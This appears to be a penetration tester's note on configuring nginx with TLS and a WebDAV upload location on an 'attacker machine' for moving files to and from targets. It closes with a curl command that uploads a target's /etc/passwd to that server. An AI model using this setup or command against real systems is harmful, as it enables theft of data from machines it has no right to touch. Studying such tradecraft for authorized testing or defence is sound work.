Yes, set up `nginx` on attacker machine for file transfer

Guide mostly from [DigitalOcean](https://www.digitalocean.com/community/tutorials/how-to-create-a-self-signed-ssl-certificate-for-nginx-in-ubuntu-20-04-1)

```sh
sudo apt update && sudo apt install nginx -y
sudo mkdir -p /var/www/uploads/ /var/www/downloads/
sudo chown -R www-data:www-data /var/www/uploads/ /var/www/downloads/
sudo openssl req -x509 -nodes -days 365 -newkey rsa:4096 -keyout /etc/ssl/private/nginx-selfsigned.key -out /etc/ssl/certs/nginx-selfsigned.crt
# Perfect Forward Secrecy
sudo openssl dhparam -out /etc/nginx/dhparam.pem 4096
```

`/etc/nginx/nginx.conf`. Set `server_tokens` to `off`. This disable version reporting in http header. Security by obscurity, but there is no evil I won't commit just to be a little safer.

```
server_tokens off;
```

`/etc/nginx/snippets/ssl-params.conf`

```
ssl_protocols TLSv1.3;
ssl_prefer_server_ciphers on;
ssl_dhparam /etc/nginx/dhparam.pem; 
ssl_ciphers EECDH+AESGCM:EDH+AESGCM;
ssl_ecdh_curve secp384r1;
ssl_session_timeout  10m;
ssl_session_cache shared:SSL:10m;
ssl_session_tickets off;
ssl_stapling on;
ssl_stapling_verify on;
resolver 8.8.8.8 8.8.4.4 valid=300s;
resolver_timeout 5s;
# Disable strict transport security for now. You can uncomment the following
# line if you understand the implications.
#add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload";
add_header X-Frame-Options DENY;
add_header X-Content-Type-Options nosniff;
add_header X-XSS-Protection "1; mode=block";
```

`/etc/nginx/sites-available/site`

```
server {
    listen 443 ssl;
    include snippets/ssl-params.conf;
    
    ssl_certificate /etc/ssl/certs/nginx-selfsigned.crt;
	ssl_certificate_key /etc/ssl/private/nginx-selfsigned.key;

    location /uploads/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }

	location /downloads/ {
        root    /var/www/downloads;
    }
}
```

Start `nginx` service

```sh
# Test config
sudo nginx -t
# Start nginx
sudo systemctl start nginx
```

> I don't recommend enable `nginx` on attacker machine. Just start the service when needed and stop it when done. Just personal preferences, I don't want to expose a service to our target. I don't wanna get hacked back lmao.

## Upload

```sh
curl -T /etc/passwd https://10.0.0.1/uploads/users.txt
```